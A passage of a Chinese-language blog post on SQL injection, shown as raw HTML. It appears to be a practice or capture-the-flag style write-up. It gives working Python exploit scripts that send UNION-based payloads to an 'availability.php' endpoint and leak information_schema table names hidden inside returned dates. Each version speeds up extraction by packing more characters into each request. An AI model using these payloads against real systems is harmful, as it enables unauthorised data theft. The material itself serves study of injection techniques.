class=\"token operator\">=</span> <span class=\"token string\">\" FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'\"</span><br>fr <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>fr<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br>start <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span><br>  payload <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'ascii(SUBSTRING(</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>field<span class=\"token punctuation\">}</span></span><span class=\"token string\">,</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>index<span class=\"token punctuation\">}</span></span><span class=\"token string\">))*86400%2b</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>base_time<span class=\"token punctuation\">}</span></span><span class=\"token string\">'</span></span><br>  response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>host<span class=\"token punctuation\">}</span></span><span class=\"token string\">/availability.php?id=12345%20union%20select%201%20,</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>base_time<span class=\"token punctuation\">}</span></span><span class=\"token string\">,</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>payload<span class=\"token punctuation\">}</span></span><span class=\"token string\">,4%20</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>fr<span class=\"token punctuation\">}</span></span><span class=\"token string\">&amp;start_time=2023-01-01&amp;end_time=2023-01-01'</span></span><span class=\"token punctuation\">)</span><br>  index <span class=\"token operator\">+=</span><span class=\"token number\">1</span><br>  <span class=\"token keyword\">if</span> response<span class=\"token punctuation\">.</span>ok<span class=\"token punctuation\">:</span><br>    data <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><br>    d <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token string\">'events'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'end'</span><span class=\"token punctuation\">]</span><br>    <span class=\"token keyword\">if</span> d <span class=\"token operator\">==</span> <span class=\"token string\">'2023-01-01'</span><span class=\"token punctuation\">:</span><br>      <span class=\"token keyword\">break</span><br>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><br>      diff <span class=\"token operator\">=</span> datetime<span class=\"token punctuation\">.</span>datetime<span class=\"token punctuation\">.</span>strptime<span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%Y-%m-%d\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> base_time<br>      result <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>diff<span class=\"token operator\">/</span><span class=\"token number\">86400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br>      <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><br>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'error'</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">break</span><br><br><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"time: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> start<span class=\"token punctuation\">}</span></span><span class=\"token string\">s\"</span></span><span class=\"token punctuation\">)</span></code></pre>\n<p>跑起來的結果會是這樣：</p>\n<p><img src=\"/img/posts/huli/sql-injection-in-action/p5.png\" alt=\"\"></p>\n<p>一次 leak 出一個字元，花了大約 40 秒得到完整結果。</p>\n<h3 id=\"%E5%8A%A0%E9%80%9F%EF%BC%9A%E4%B8%80%E6%AC%A1%E5%81%B7%E6%B8%A1%E5%85%A9%E5%80%8B%E5%AD%97\"><a class=\"direct-link\" href=\"#%E5%8A%A0%E9%80%9F%EF%BC%9A%E4%B8%80%E6%AC%A1%E5%81%B7%E6%B8%A1%E5%85%A9%E5%80%8B%E5%AD%97\">#</a> 加速：一次偷渡兩個字</h3>\n<p>既然都可以把資料換成數字偷偷塞在日期裡面了，何不一次偷渡兩個字呢？為了不讓數字衝突而且好算，第二個字需要再乘以 128。</p>\n<p>程式碼如下：</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># exploit-ava-2x.py</span><br><span class=\"token keyword\">import</span> requests<br><span class=\"token keyword\">import</span> datetime<br><span class=\"token keyword\">import</span> json<br><span class=\"token keyword\">import</span> urllib<span class=\"token punctuation\">.</span>parse<br><span class=\"token keyword\">import</span> time<br><br><span class=\"token keyword\">def</span> <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>raw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>  <span class=\"token keyword\">return</span> urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>raw<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br>host <span class=\"token operator\">=</span> <span class=\"token string\">'https://od-php.herokuapp.com/sql'</span><br>base_time <span class=\"token operator\">=</span> <span class=\"token number\">1672502400</span><br>index <span class=\"token operator\">=</span> <span class=\"token number\">1</span><br>result <span class=\"token operator\">=</span> <span class=\"token string\">''</span><br>field <span class=\"token operator\">=</span> <span class=\"token string\">'group_concat(table_name)'</span><br>fr <span class=\"token operator\">=</span> <span class=\"token string\">\" FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'\"</span><br>fr <span class=\"token operator\">=</span> encode<span class=\"token punctuation\">(</span>fr<span class=\"token punctuation\">)</span><br>start <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span><br>  payload <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'''<br>    ascii(SUBSTRING(</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>field<span class=\"token punctuation\">}</span></span><span class=\"token string\">,</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>index<span class=\"token punctuation\">}</span></span><span class=\"token string\">))*86400<br>    + ascii(SUBSTRING(</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>field<span class=\"token punctuation\">}</span></span><span class=\"token string\">,</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>index<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">))*86400*128<br>    + </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>base_time<span class=\"token punctuation\">}</span></span><span class=\"token string\"><br>  '''</span></span><br>  response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>host<span class=\"token punctuation\">}</span></span><span class=\"token string\">/availability.php?id=12345%20union%20select%201%20,</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>base_time<span class=\"token punctuation\">}</span></span><span class=\"token string\">,</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>encode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">,4%20</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>fr<span class=\"token punctuation\">}</span></span><span class=\"token string\">&amp;start_time=2023-01-01&amp;end_time=2023-01-01'</span></span><span class=\"token punctuation\">)</span><br>  index <span class=\"token operator\">+=</span><span class=\"token number\">2</span><br>  <span class=\"token keyword\">if</span> response<span class=\"token punctuation\">.</span>ok<span class=\"token punctuation\">:</span><br>    data <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><br>    d <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token string\">'events'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'end'</span><span class=\"token punctuation\">]</span><br>    <span class=\"token keyword\">if</span> d <span class=\"token operator\">==</span> <span class=\"token string\">'2023-01-01'</span><span class=\"token punctuation\">:</span><br>      <span class=\"token keyword\">break</span><br>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><br>      diff <span class=\"token operator\">=</span> datetime<span class=\"token punctuation\">.</span>datetime<span class=\"token punctuation\">.</span>strptime<span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%Y-%m-%d\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> base_time<br>      <br>      diff <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>diff<span class=\"token operator\">/</span><span class=\"token number\">86400</span><span class=\"token punctuation\">)</span><br>      first <span class=\"token operator\">=</span> diff <span class=\"token operator\">%</span> <span class=\"token number\">128</span><br>      result <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>first<span class=\"token punctuation\">)</span><br><br>      second <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>diff <span class=\"token operator\">-</span> first<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">128</span><span class=\"token punctuation\">)</span><br>      <span class=\"token keyword\">if</span> second <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span><br>        <span class=\"token keyword\">break</span><br>      result <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>second<span class=\"token punctuation\">)</span><br>      <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"current:\"</span><span class=\"token punctuation\">,</span> result<span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><br>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'error'</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">break</span><br><br><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"result:\"</span><span class=\"token punctuation\">,</span> result<span class=\"token punctuation\">)</span><br><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"time: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> start<span class=\"token punctuation\">}</span></span><span class=\"token string\">s\"</span></span><span class=\"token punctuation\">)</span></code></pre>\n<p>跑起來的結果：</p>\n<p><img src=\"/img/posts/huli/sql-injection-in-action/p6.png\" alt=\"\"></p>\n<p>總共花了 19 秒，是上一個做法的兩倍，十分合理。</p>\n<h3 id=\"%E5%86%8D%E5%8A%A0%E9%80%9F%EF%BC%9A%E4%B8%80%E6%AC%A1%E5%81%B7%E6%B8%A1-n-%E5%80%8B%E5%AD%97\"><a class=\"direct-link\" href=\"#%E5%86%8D%E5%8A%A0%E9%80%9F%EF%BC%9A%E4%B8%80%E6%AC%A1%E5%81%B7%E6%B8%A1-n-%E5%80%8B%E5%AD%97\">#</a> 再加速：一次偷渡 n 個字</h3>\n<p>剛剛的做法，其實就是把字串視為是一個 128 進位的數字，例如說 <code>mvc</code>，換成 ascii code 分別是 109, 119, 99，變成數字就會是 <code>99 + 128*119 + 128*128*109</code> = 1801187，也就是 180 萬天，大約是 4935 年。</p>\n<p>理論上只要這個年份不超過程式語言可以表示的範圍，我們就能一次拿出多個字元，以 PHP 為例，我們可以寫個簡單的腳本算一下：</p>\n<pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span><br>  <span class=\"token variable\">$base</span> <span class=\"token operator\">=</span> <span class=\"token number\">1672502400</span><span class=\"token punctuation\">;</span><br>  <span class=\"token variable\">$num</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span><br>  <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">10</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token variable\">$num</span> <span class=\"token operator\">*=</span> <span class=\"token number\">128</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Y-m-d'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$num</span><span class=\"token operator\">*</span><span class=\"token number\">86400</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token delimiter important\">?></span></span></code></pre>\n<p>輸出是：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">1<br>2023-05-08<br>2<br>2067-11-09<br>3<br>7764-10-21<br>4<br>736974-04-25<br>5<br>94075791-06-08<br>6<br>12041444382-10-24<br>7<br>PHP Warning:  date() expects parameter 2 to be int, float given in /Users/li.hu/Documents/playground/ctf/sql-injection/test.php on line 7<br><br>8<br>PHP Warning:  date() expects parameter 2 to be int, float given in /Users/li.hu/Documents/playground/ctf/sql-injection/test.php on line 7<br><br>9<br>PHP Warning:  date() expects parameter 2 to be int, float given in /Users/li.hu/Documents/playground/ctf/sql-injection/test.php on line 7<br><br>10<br>PHP Warning:  date() expects parameter 2 to be int, float given in /Users/li.hu/Documents/playground/ctf/sql-injection/test.php on line 7</code></pre>\n<p>代表我們最多可以一次拿 5 個字元，因為 <code>128^6</code> 還在許可範圍之內，不會爆炸。</p>\n<p>但是呢，Python 在使用 <code>datetime.strptime</code> 將日期轉為 timestamp 時，最高的上限似乎是 9999 年，超過以後就會拋錯。因此，除非自己寫一套轉換，否則最多就只能一次拿 3 個字元的資料。寫這個轉換光想就很麻煩（要考慮到每個月的天數跟閏年），因此我只實作了 3 個字元的版本，程式碼如下：</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># exploit-ava-3x.py</span><br><span class=\"token keyword\">import</span> requests<br><span class=\"token keyword\">import</span> datetime<br><span class=\"token keyword\">import</span> json<br><span class=\"token keyword\">import</span> urllib<span class=\"token punctuation\">.</span>parse<br><span class=\"token keyword\">import</span> time<br><br><span class=\"token keyword\">def</span> <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>raw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>  <span class=\"token keyword\">return</span> urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>raw<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br>host <span class=\"token operator\">=</span> <span class=\"token string\">'https://od-php.herokuapp.com/sql'</span><br>base_time <span class=\"token operator\">=</span> <span class=\"token number\">1672502400</span><br>index <span class=\"token operator\">=</span> <span class=\"token number\">1</span><br>result <span class=\"token operator\">=</span> <span class=\"token string\">''</span><br>field <span class=\"token operator\">=</span> <span class=\"token string\">'group_concat(table_name)'</span><br>fr <span class=\"token operator\">=</span> <span class=\"token string\">\" FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'\"</span><br>fr <span class=\"token operator\">=</span> encode<span class=\"token punctuation\">(</span>fr<span class=\"token punctuation\">)</span><br>start <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span><br>  payload <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'''<br>    ascii(SUBSTRING(</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>field<span class=\"token punctuation\">}</span></span><span class=\"token string\">,</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>index<span class=\"token punctuation\">}</span></span><span class=\"token string\">))*86400<br>    + ascii(SUBSTRING(</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>field<span class=\"token punctuation\">}</span></span><span class=\"token string\">,</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>index<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">))*86400*128<br>    + ascii(SUBSTRING(</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>field<span class=\"token punctuation\">}</span></span><span class=\"token string\">,</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>index<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">))*86400*128*128<br>    + </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>base_time<span class=\"token punctuation\">}</span></span><span class=\"token string\"><br>  '''</span></span><br>  response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>host<span class=\"token punctuation\">}</span></span><span class=\"token string\">/availability.php?id=12345%20union%20select%201%20,</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>base_time<span class=\"token punctuation\">}</span></span><span class=\"token string\">,</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>encode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">,4%20</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>fr<span class=\"token punctuation\">}</span></span><span class=\"token string\">&amp;start_time=2023-01-01&amp;end_time=2023-01-01'</span></span><span class=\"token punctuation\">)</span><br>  index <span class=\"token operator\">+=</span> <span class=\"token number\">3</span><br>  <span class=\"token keyword\">if</span> response<span class=\"token punctuation\">.</span>ok<span class=\"token punctuation\">:</span><br>    data <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><br>    d <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token string\">'events'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'end'</span><span class=\"token punctuation\">]</span><br>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> d <span class=\"token operator\">==</span> <span class=\"token string\">'2023-01-01'</span><span class=\"token punctuation\">:</span><br>      <span class=\"token keyword\">break</span><br>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><br>      diff <span class=\"token operator\">=</span> datetime<span class=\"token punctuation\">.</span>datetime<span class=\"token punctuation\">.</span>strptime<span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%Y-%m-%d\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> base_time<br>      diff <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>diff<span class=\"token operator\">/</span><span class=\"token number\">86400</span><span class=\"token punctuation\">)</span><br>      is_over <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span><br>      <span class=\"token keyword\">while</span> diff <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span><br>        num <span class=\"token operator\">=</span> diff <span class=\"token operator\">%</span> <span class=\"token number\">128</span><br>        <span class=\"token keyword\">if</span> num <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span><br>          is_over <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span><br>          <span class=\"token keyword\">break</span><br>        result <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><br>        diff <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>diff <span class=\"token operator\">-</span> num<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">128</span><span class=\"token punctuation\">)</span><br><br>      <span class=\"token keyword\">if</span> is_over<span class=\"token punctuation\">:</span><br>        <span class=\"token keyword\">break</span><br><br>      <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"current:\"</span><span class=\"token punctuation\">,</span> result<span class=\"token punctuation\">)</span><br>      <br>  <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><br>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'error'</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">break</span><br><br><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"result:\"</span><span class=\"token punctuation\">,</span> result<span class=\"token punctuation\">)</span><br><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"time: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> start<span class=\"token punctuation\">}</span></span><span class=\"token string\">s\"</span></span><span class=\"token punctuation\">)</span></code></pre>\n<p>跑起來的結果：</p>\n<p><img src=\"/img/posts/huli/sql-injection-in-action/p7.png\" alt=\"\"></p>\n<p>大約是 13 秒，又更快了一點。</p>\n<h3 id=\"%E6%9C%80%E5%BE%8C%E7%9A%84%E5%8A%A0%E9%80%9F%EF%BC%9A%E5%96%84%E7%94%A8%E5%A4%9A%E5%80%8B%E6%97%A5%E6%9C%9F\"><a class=\"direct-link\" href=\"#%E6%9C%80%E5%BE%8C%E7%9A%84%E5%8A%A0%E9%80%9F%EF%BC%9A%E5%96%84%E7%94%A8%E5%A4%9A%E5%80%8B%E6%97%A5%E6%9C%9F\">#</a> 最後的加速：善用多個日期</h3>\n<p>前面我們的日期區間都只傳入了一天，所以 response 就只有一天的結果，但這個功能其實可以傳入一個日期區間，例如說如果我們傳入 <code>2023-01-01 ~ 2023-01-05</code>，就會拿到五天的 response：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token punctuation\">{</span><br>    <span class=\"token string\">\"events\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><br>        <span class=\"token punctuation\">{</span><br>            <span class=\"token string\">\"start\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2021-01-01\"</span><span class=\"token punctuation\">,</span><br>            <span class=\"token string\">\"end\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2021-01-01\"</span><span class=\"token punctuation\">,</span><br>            <span class=\"token string\">\"status\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Unavailable\"</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>        <span class=\"token punctuation\">{</span><br>            <span class=\"token string\">\"start\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2021-01-02\"</span><span class=\"token punctuation\">,</span><br>            <span class=\"token string\">\"end\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2021-01-02\"</span><span class=\"token punctuation\">,</span><br>            <span class=\"token string\">\"status\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Unavailable\"</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>        <span class=\"token punctuation\">{</span><br>            <span class=\"token string\">\"start\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2021-01-03\"</span><span class=\"token punctuation\">,</span><br>            <span class=\"token string\">\"end\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2021-01-03\"</span><span class=\"token punctuation\">,</span><br>            <span class=\"token string\">\"status\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Unavailable\"</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>        <span class=\"token punctuation\">{</span><br>            <span class=\"token string\">\"start\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2021-01-04\"</span><span class=\"token punctuation\">,</span><br>            <span class=\"token string\">\"end\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2021-01-04\"</span><span class=\"token punctuation\">,</span><br>            <span class=\"token string\">\"status\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Unavailable\"</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>        <span class=\"token punctuation\">{</span><br>            <span class=\"token string\">\"start\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2021-01-05\"</span><span class=\"token punctuation\">,</span><br>            <span class=\"token string\">\"end\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2021-01-05\"</span><span class=\"token punctuation\">,</span><br>            <span class=\"token string\">\"status\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Unavailable\"</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">]</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>為了簡化 query，剛剛的 query 我們都只用到了一個日期而已，而我們知道一個日期可以傳回 3 個字元的資訊，如果我們精心設計一下 query，讓每天的回傳值都帶著 3 個字元，若是 10 天都用到，就能一次回傳 30 個字元，query 會像這樣：</p>\n<pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1672502400</span><span class=\"token punctuation\">,</span><br>      ascii<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span>group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">86400</span><br>      <span class=\"token operator\">+</span> ascii<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span>group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">86400</span><span class=\"token operator\">*</span><span class=\"token number\">128</span><br>      <span class=\"token operator\">+</span> ascii<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span>group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">86400</span><span class=\"token operator\">*</span><span class=\"token number\">128</span><span class=\"token operator\">*</span><span class=\"token number\">128</span><br>      <span class=\"token operator\">+</span> <span class=\"token number\">1672502400</span><br>    <span class=\"token punctuation\">,</span><span class=\"token number\">1</span>  <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">WHERE</span> table_schema <span class=\"token operator\">!=</span> <span class=\"token string\">'mysql'</span> <span class=\"token operator\">AND</span> table_schema <span class=\"token operator\">!=</span> <span class=\"token 